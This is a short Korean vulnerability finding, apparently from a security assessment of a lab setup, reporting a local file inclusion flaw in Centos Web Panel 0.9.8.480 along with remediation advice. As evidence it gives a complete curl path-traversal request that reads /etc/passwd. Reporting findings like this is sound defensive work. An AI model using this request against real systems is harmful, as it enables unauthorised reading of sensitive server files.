## Centos Web Panel 0.9.8.480 - Local File Inclusion
- **End-Point**: `http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php/admin/index.php`, `http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php`
- **영향**: 취약점 악용 성공 시 공격자가 서버 내의 민감한 파일을 열람하거나 읽을 수 있습니다.
- **설명**: Centos Web Panel 0.9.8.480 버전에서 로컬 파일 포함(LFI) 취약점이 발견되었습니다. 이 버전은 XSS 및 원격 코드 실행(RCE) 등의 다른 취약점에도 노출되어 있는 것으로 알려져 있습니다.
- **근거**: `curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0' 'http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd'` 명령을 통해 `/etc/passwd` 파일에 접근 가능한 것이 확인되었습니다.
- **대응**: 최신 보안 패치가 적용된 버전으로 업데이트를 수행하고, 사용자 입력값에 대한 경로 검증 로직을 구현해야 합니다.
- **조치**: 외부에서 접근 가능한 파라미터에 디렉토리 이동 문자열(`../`) 사용을 제한하고, 파일 시스템 접근 권한을 최소화하여 인가되지 않은 파일 읽기를 차단합니다.
